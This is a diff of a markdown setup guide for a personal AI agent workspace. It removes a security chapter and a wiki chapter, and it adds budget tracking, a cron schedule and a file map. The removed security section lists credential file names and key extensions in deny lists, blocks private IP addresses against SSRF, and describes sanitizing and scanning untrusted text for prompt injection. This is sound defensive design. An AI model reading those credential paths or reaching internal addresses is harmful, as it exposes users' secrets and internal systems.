-bash tools/security/access-control.sh check-url "http://192.168.1.1/admin"
-# {"allowed": false, "reason": "Private IP (192.168.x)"}
-```
-
-Path guards:
-- Deny list: `.env`, `.ssh`, `credentials`, `tokens`, `id_rsa`, `.gnupg`, `keychain`, `secret`, `.netrc`
-- Deny extensions: `.pem`, `.key`, `.p12`, `.pfx`, `.jks`
-- Allowed directories whitelist (only your workspace + projects + tmp)
-
-URL safety:
-- Only http/https allowed
-- Block private/reserved IPs (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x, ::1)
-- Block DNS rebinding services
-
-### 17.8 Master Gate
-
-Chains Layer 1 + Layer 2 behind a single entry point:
-
-```bash
-# Full gate (sanitize + scan):
-echo "untrusted text" | bash tools/security/gate.sh --source web
-
-# Sanitize only (skip LLM scanner):
-echo "untrusted text" | bash tools/security/gate.sh --sanitize-only
-
-# For email (fail-closed on scanner error):
-echo "email body" | bash tools/security/gate.sh --source email
-```
-
-### 17.9 Configuration
-
-All thresholds in one file (`tools/security/config.json`):
-
-```json
-{
-  "sanitizer": { "max_chars": 50000, "block_threshold": 3 },
-  "scanner": {
-    "model": "gpt-4o-mini",
-    "review_threshold": 35,
-    "block_threshold": 70,
-    "fail_closed_sources": ["email", "webhook"],
-    "fail_open_sources": ["chat", "web"]
+  "projects": {
+    "exchange-pms": { "total": 45.20, "this_week": 12.30 },
+    "verdictai": { "total": 18.50, "this_week": 5.10 },
+    "background-crons": { "total": 22.00, "this_week": 4.50 }
   },
-  "governance": {
-    "spend_warn_5min": 5.0,
-    "spend_cap_5min": 15.0,
-    "volume_cap_10min": 200,
-    "lifetime_cap": 500
-  },
-  "access": {
-    "allowed_dirs": ["/Users/you/workspace/", "/tmp/"],
-    "deny_filenames": [".env", ".ssh", "credentials", "tokens", "id_rsa"]
-  }
+  "daily_budget": 25.00,
+  "weekly_budget": 150.00
 }
 ```
 
-### 17.10 Benefits Analysis
-
-| Before | After | Impact |
-|--------|-------|--------|
-| Untrusted X articles go straight to context | Sanitized first, role markers stripped | Invisible Unicode and injection patterns caught before LLM sees them |
-| Outbound messages could leak credentials | Gate checks every message before send | API keys, file paths, PII auto-blocked |
-| No spend protection | $15/5min hard cap + volume + lifetime limits | Runaway crons and retry storms can't drain your API budget |
-| Agent can read any file | Path deny list blocks .env, .ssh, credentials | Successful injection can't escalate to credential theft |
-| Agent can hit any URL | Private IPs blocked, only http/https | No SSRF attacks to internal services |
-| One failure = full compromise | 6 independent layers | Each layer works alone; no single point of failure |
-
-**The key insight from Berman:** *"Each layer has to be independent. The sanitizer catches known patterns. The scanner catches semantic attacks. The governor caps the damage if both fail. No single layer is enough, and if any layer depends on another working correctly, the whole system is fragile. Independence is the point."*
+Wire into the governance layer (Phase 14) for per-project spend caps.
 
 ---
 
-## Phase 18: LLM Wiki — Persistent Knowledge Base (Karpathy Pattern)
+## Reference Appendix
 
-Inspired by Andrej Karpathy's "llm-wiki" gist (2026). The core problem: most agents treat knowledge like RAG — re-discover from scratch on every query. Nothing accumulates. Ask a question that requires synthesizing five documents, and the agent pieces fragments together every time.
+### Build Harness Skill Files
 
-This phase builds a **persistent, compounding wiki** — structured, interlinked markdown files that the agent maintains. When you add a new source, the agent doesn't just index it. It reads it, extracts key information, and **integrates it into existing wiki pages** — updating entities, revising summaries, flagging contradictions.
+| Skill | Path | Purpose |
+|-------|------|---------|
+| evaluator | `skills/evaluator/SKILL.md` | Skeptical critic with 4 criteria, browser testing, anti-leniency |
+| build-harness | `skills/build-harness/SKILL.md` | 3-agent orchestration: planner → generator → evaluator |
+| jonyive | `skills/jonyive/SKILL.md` | Design principles mapped to evaluator criteria |
 
-### 18.1 Three Layers
+### Full Cron Schedule
 
-| Layer | What It Is | Who Maintains It |
-|-------|-----------|------------------|
-| **Raw Sources** | `memory/ingested/` — articles, papers, transcripts | Immutable. Agent reads but never modifies. |
-| **The Wiki** | `memory/wiki/entities/` + `memory/wiki/concepts/` | Agent owns entirely. Creates, updates, cross-references. |
-| **The Schema** | `AGENTS.md` instructions | You and the agent co-evolve. |
+| Job | Schedule | Model | Purpose |
+|-----|----------|-------|---------|
+| hourly-memory-summarizer | :55 every hour | Sonnet | Keep context fresh |
+| vector-memory-reindex | Every 4h | Sonnet | Rebuild semantic search |
+| morning-brief | 7 AM daily | Sonnet | Daily briefing |
+| forge-daily-review | 6:30 AM daily | Sonnet | Ops audit |
+| daily-roundtable | 9 PM daily | Sonnet | Cross-agent synthesis |
+| forge-weekly-synthesis | Sunday 9 PM | Sonnet | Weekly rollup |
+| weekly-memory-compound | Sunday 10 PM | Sonnet | Weekly distillation |
+| daily-task-prep | 6 AM daily | Sonnet | Task promotion + dedup |
+| email-sweep | Every 15 min | Sonnet | Inbox triage |
+| meta-review | Sunday 10 AM | Sonnet | Episode analysis |
+| episode-consolidation | Sunday 3 AM | Sonnet | Duplicate merge + archive |
+| episode-index-rebuild | 2 AM daily | Sonnet | Episode search index |
 
-### 18.2 Wiki Structure
+### File Map
 
 ```
-memory/wiki/
-├── entities/           # People, companies, projects, tools
-│   ├── exchange-building.md
-│   ├── hyperliquid.md
-│   ├── silverleafe.md
-│   ├── openclaw.md
-│   └── ...
-├── concepts/           # Ideas, patterns, strategies
-│   ├── agentic-memory.md
-│   ├── multi-agent-coordination.md
-│   ├── prompt-injection-defense.md
-│   └── ...
-├── index.md            # Master catalog with one-line summaries
-├── log.md              # Chronological operations log
-└── lint-report.md      # Latest health check results
+workspace/
+├── AGENTS.md              # Boot sequence
+├── SOUL.md                # Agent identity
+├── USER.md                # Human profile
+├── MEMORY.md              # Long-term memory index
+├── CONTEXT_INJECTION.md   # Auto-generated recent context
+├── HEARTBEAT.md           # Heartbeat checklist
+├── active-tasks.md        # Crash recovery
+├── consent-registry.md    # Consent tracking for sensitive ops
+├── memory/
+│   ├── YYYY-MM-DD.md      # Daily logs
+│   ├── hourly/            # Hourly summaries
+│   ├── weekly/            # Weekly distillations
+│   ├── ingested/          # Brain-ingest outputs
+│   ├── retros/            # Engineering retrospectives
+│   ├── trace-analysis/    # Forge reports + pattern database
+│   ├── episodes/          # Episodic memory (JSON)
+│   ├── wiki/              # LLM Wiki (entities + concepts)
+│   ├── user-profile.md    # User details
+│   ├── infrastructure.md  # Tools & infra notes
+│   ├── projects.md        # Active projects
+│   └── lessons-learned.md # Hard-won lessons
+├── shared-context/
+│   ├── priorities.md      # Priority stack
+│   ├── agent-outputs/     # Per-agent output dirs
+│   ├── feedback/          # Structured feedback
+│   ├── roundtable/        # Cross-agent synthesis
+│   ├── kpis/              # Metrics
+│   └── calendar/          # Events
+├── tasks/
+│   ├── current.md         # Canonical task list
+│   └── archive/           # Weekly task archives
+├── campaigns/             # Long-running workflow state
+├── tools/
+│   ├── vector-memory/     # FAISS semantic search
+│   ├── brain-ingest/      # URL → knowledge pipeline
+│   ├── forge/             # Monitoring agent prompts
+│   ├── wiki/              # LLM Wiki tools (ingest, lint, contradictions)
+│   ├── episodes/          # Episodic memory tools
+│   ├── episodic-memory/   # Meta-review scripts
+│   ├── security/          # 6-layer defense tools
+│   ├── email-sweep/       # Email triage config
+│   ├── hourly-summarizer.py
+│   ├── context-injector.py
+│   ├── weekly-compound.py
+│   ├── roundtable.py
+│   ├── feedback-logger.py
+│   ├── daily-task-prep.sh
+│   └── ensure-daily-log.sh
+├── skills/                # Custom skills (SKILL.md each)
+│   ├── evaluator/         # GAN-style skeptical evaluator
+│   ├── build-harness/     # 3-agent build orchestration
+│   ├── brain-ingest/      # Knowledge ingestion
+│   ├── email-sweep/       # Email triage
+│   └── [other skills]/
+├── .harness/              # Build harness working directory (per-project)
+│   ├── spec.md            # Planner output
+│   ├── design-language.md # Visual direction
+│   ├── contracts/         # Sprint contract negotiations
+│   ├── evaluations/       # Evaluator scores + feedback
+│   └── harness-log.md     # Running log
+└── decisions/             # Documented decisions with review dates
 ```
 
-Each wiki page has:
-- YAML frontmatter (type, created, updated, sources, related)
-- Summary section
-- Details organized by topic
-- Cross-references using `[[wikilinks]]` (Obsidian-compatible)
-- Source history (which ingests contributed to this page)
+### Cost Expectations
 
-### 18.3 Operations
+With all crons running on Sonnet and direct chat on Opus:
+- **Hourly summarizer:** ~$0.01/run x 24 = ~$0.24/day
+- **Vector reindex:** Free (local Python)
+- **Roundtable:** ~$0.02/run = ~$0.02/day
+- **Forge daily:** ~$0.05/run = ~$0.05/day
+- **Morning brief:** ~$0.10/run = ~$0.10/day
+- **Weekly crons:** ~$0.15/week
+- **Heartbeats (Sonnet, every 30min):** ~$0.005/run x 48 = ~$0.24/day
+- **Email sweep:** ~$0.005/run x 48 = ~$0.24/day
+- **Total background cost: ~$0.90/day or ~$27/month**
 
-**Ingest:** Drop a new source → agent reads it → extracts entities/concepts → updates existing wiki pages or creates new ones → updates index → appends to log. A single source can touch 10-15 wiki pages.
-
-```bash
-# Process a new source into the wiki:
-bash tools/wiki/ingest-to-wiki.sh memory/ingested/2026-04-05-some-article.md
-```
-
-**Query:** Search wiki first for answers. Good answers get filed back as new wiki pages — explorations compound just like ingested sources.
-
-**Lint:** Health-check the wiki periodically:
-
-```bash
-bash tools/wiki/lint.sh
-```
-
-Checks for:
-- **Orphan pages** — wiki pages with no inbound links
-- **Missing entities** — terms mentioned 3+ times but lacking their own page
-- **Stale pages** — not updated in 30+ days
-- **Broken cross-references** — `[[links]]` pointing to non-existent pages
-- **Low-source pages** — only 1 source (weak evidence base)
-
-### 18.4 Contradiction Detection
-
-When new information arrives, check if it conflicts with existing wiki pages:
-
-```bash
-bash tools/wiki/check-contradictions.sh
-```
-
-Flags:
-- Price/number claims that differ between pages
-- Status claims that conflict (one page says "active", another says "blocked")
-- Date claims that are inconsistent
-- Stale financial data from older sources
-
-### 18.5 Integration
-
-**AGENTS.md** — Add to boot sequence:
-```markdown
-After ingesting new information, update relevant wiki entity/concept pages.
-When answering research questions, check wiki pages first, then file good answers back.
-```
-
-**HEARTBEAT.md** — Monthly wiki lint:
-```markdown
-## Wiki Health Check
-- Monthly: run bash tools/wiki/lint.sh
-- Check for orphan pages, stale claims, missing entities
-- Track in memory/heartbeat-state.json under "lastWikiLint"
-```
-
-**Obsidian** — The wiki uses `[[wikilinks]]` throughout, so opening `memory/wiki/` in Obsidian gives you a full graph view of your knowledge base with all cross-references visualized.
-
-### 18.6 Key Insight
-
-From Karpathy: *"The tedious part of maintaining a knowledge base is not the reading or the thinking — it's the bookkeeping. Updating cross-references, keeping summaries current, noting when new data contradicts old claims. Humans abandon wikis because the maintenance burden grows faster than the value. LLMs don't get bored and can touch 15 files in one pass."*
-
-The human's job: curate sources, direct analysis, ask good questions, think about what it means.
-The agent's job: everything else.
-
-### 18.7 Benefits
-
-| Before | After |
-|--------|-------|
-| Ingested articles sit as standalone files | Each ingest updates entity/concept pages across the wiki |
-| No cross-referencing between sources | `[[wikilinks]]` connect related knowledge automatically |
-| Contradictions go unnoticed | Contradiction detector flags conflicting claims |
-| Stale info stays forever | Lint catches outdated pages, low-source claims |
-| Knowledge scatters | Knowledge compounds — richer with every source added |
-| Ask the same synthetic question repeatedly | Synthesis exists as persistent wiki pages |
+Direct conversations (Opus) are additional, based on usage.
 
 ---
 
-*Built by Sardor Umarov. Working implementation at PFICO. Battle-testing since February 2026 — continuously evolving, so check back for the latest version.*
+*Built by Sardor Umarov. Working implementation at Exchange Building. Battle-testing since February 2026 — continuously evolving, so check back for the latest version.*
